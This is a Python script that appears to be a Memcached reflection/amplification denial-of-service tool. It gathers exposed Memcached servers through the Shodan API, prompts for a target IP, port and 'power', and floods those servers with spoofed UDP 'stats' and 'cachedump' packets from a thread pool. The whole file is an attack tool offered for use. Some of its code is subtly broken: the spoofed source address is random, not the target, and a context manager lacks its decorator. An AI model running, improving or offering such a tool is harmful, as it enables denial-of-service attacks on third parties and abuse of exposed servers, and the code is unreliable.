#-- coding: utf8 --
#!/usr/bin/env python3
import sys
import os
import time
import shodan
import ipaddress
import logging
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout
from random import randint, uniform, choice
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

# Global constants
RATE_LIMIT_DELAY = 2  # Delay for rate-limiting API requests
MAX_WORKERS = 50  # Maximum number of threads for sending packets

# Context manager to suppress stdout
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

# Validate if a string is a valid IP address
def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# Generate a random spoofed IP address
def random_ip():
    return f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"

# Generate a random payload for the attack
def generate_payload():
    commands = [
        "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n",
        "\x00\x00\x00\x00\x00\x01\x00\x00stats cachedump 1 0\r\n",
        "\x00\x00\x00\x00\x00\x01\x00\x00get key\r\n"
    ]
    return choice(commands)

# Initialize Shodan API
def initialize_api():
    global SHODAN_API_KEY, api
    while True:
        try:
            api = shodan.Shodan(SHODAN_API_KEY)
            api.info()  # Test API key validity
            print('[~] API Key verified successfully.')
            break
        except shodan.APIError as e:
            print(f'[✘] API Key Error: {e}')
            SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ').strip()
            with open('api.txt', 'w') as file:
                file.write(SHODAN_API_KEY)
                print('[~] File written: ./api.txt')

# Load Shodan API key
keys = Path("./api.txt")
if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY = file.readline().strip()
else:
    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ').strip()
    with open('api.txt', 'w') as file:
        file.write(SHODAN_API_KEY)
        print('[~] File written: ./api.txt')

# Initialize Shodan API
initialize_api()

debug_logs = []  # Debug log storage

while True:
    try:
        query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
        ip_array = []

        if query.startswith('y'):
            print('[~] Checking Shodan.io API Key...')
            try:
                total_results = api.search('product:"Memcached" port:11211')['total']
                all_matches = []
                for page in range(1, (total_results // 100) + 2):
                    results = api.search('product:"Memcached" port:11211', page=page)
                    all_matches.extend(results['matches'])
                    time.sleep(RATE_LIMIT_DELAY)  # Avoid rate-limiting
                print(f'[~] Total bots retrieved: {len(all_matches)}')

                if input("[*] Save results for later usage? <Y/n>: ").lower().startswith('y'):
                    with open('bots.txt', 'w') as file:
                        for result in all_matches:
                            file.write(result['ip_str'] + "\n")
                    print('[~] File written: ./bots.txt')

                ip_array = [result['ip_str'] for result in all_matches if is_valid_ip(result['ip_str'])]
            except shodan.APIError as e:
                print(f'[✘] Error: {e}')
                if input('[*] Would you like to change the API Key? <Y/n>: ').lower().startswith('y'):
                    initialize_api()
                    continue
                else:
                    print('[✘] Exiting...')
                    break

        elif Path("./bots.txt").is_file() and input('[*] Use locally stored Shodan data? <Y/n>: ').lower().startswith('y'):
            with open('bots.txt') as file:
                ip_array = [line.strip() for line in file if is_valid_ip(line.strip())]
                print(f'[~] Total valid bots after filtering: {len(ip_array)}')

        if not ip_array:
            print('[✘] No valid bots available. Exiting...')
            break

        target = input("[▸] Enter target IP address: ").strip()
        if not is_valid_ip(target):
            print('[✘] Invalid target IP address. Exiting...')
            break

        try:
            targetport = int(input("[▸] Enter target port number (Default 80): ") or 80)
        except ValueError:
            print('[✘] Invalid target port. Exiting...')
            break

        try:
            power = int(input("[▸] Enter preferred power (Default 1): ") or 1)
        except ValueError:
            print('[✘] Invalid power value. Exiting...')
            break

        if not input(f'[*] Ready to engage target {target}? <Y/n>: ').lower().startswith('y'):
            print('[✘] Engagement canceled. Exiting...')
            break

        print('[*] Sending packets...')

        def send_payload(ip):
            src_ip = random_ip()
            payload = generate_payload()
            try:
                response = sr1(IP(src=src_ip, dst=ip) / UDP(sport=targetport, dport=11211) / Raw(load=payload), timeout=2, verbose=0)
                if response:
                    print(f"[✓] Response received from {ip}")
                else:
                    print(f"[!] No response from {ip}")
            except Exception as e:
                print(f"[✘] Error while sending to {ip}: {e}")
            time.sleep(uniform(0.5, 2))

        max_threads = min(MAX_WORKERS, len(ip_array) or 1)
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(send_payload, ip_array)

        print('[✓] Task complete! Exiting platform.')
        break

    except Exception as e:
        logging.error(f'Unexpected error: {e}')
        break
